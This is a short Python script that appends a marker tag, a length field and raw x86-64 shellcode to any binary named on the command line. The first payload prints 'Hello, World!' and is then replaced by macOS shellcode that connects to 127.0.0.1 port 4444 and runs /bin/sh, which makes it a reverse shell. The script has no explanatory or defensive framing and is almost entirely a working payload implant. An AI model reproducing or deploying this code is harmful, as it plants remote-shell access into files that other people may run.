import struct
import sys

def append(a_file):
	with open(a_file, 'a') as f:
		egg_hunter = "\x77\x00\x00\x74\x77\x00\x00\x74" 
		payload = ("\x55\x48\x89\xe5\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x04\x4c"
              		"\x89\xc0\x48\x31\xff\x66\xbf\x01\x00\xeb\x1e\x5e\x48\x31\xd2\xb2"
              		"\x0e\x0f\x05\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x01\x4c\x89"
              		"\xc0\x31\xff\x0f\x05\x48\x89\xec\x5d\xe8\xdd\xff\xff\xff\x48\x65"
              		"\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0a")
		#127.0.0.1 port 4444
		payload = ("\xb8\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f"
"\x05\x49\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6"
"\x56\x48\xbe\x00\x02\x11\x5c\x7f\x00\x00\x01\x56\x48\x89\xe6"
"\x6a\x10\x5a\x0f\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31"
"\xf6\x0f\x05\xb8\x5a\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31"
"\xc0\xb8\x3b\x00\x00\x02\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e"
"\x2f\x73\x68\x00\x48\x8b\x3c\x24\x48\x31\xd2\x52\x57\x48\x89"
"\xe6\x0f\x05")
		f.write(egg_hunter)
		f.write(struct.pack('>H', len(payload)))
		f.write(payload)



if __name__ == "__main__":

	try:
		append(sys.argv[1])

	except:
		print "Usage:", str(sys.argv[0]) + " binary"

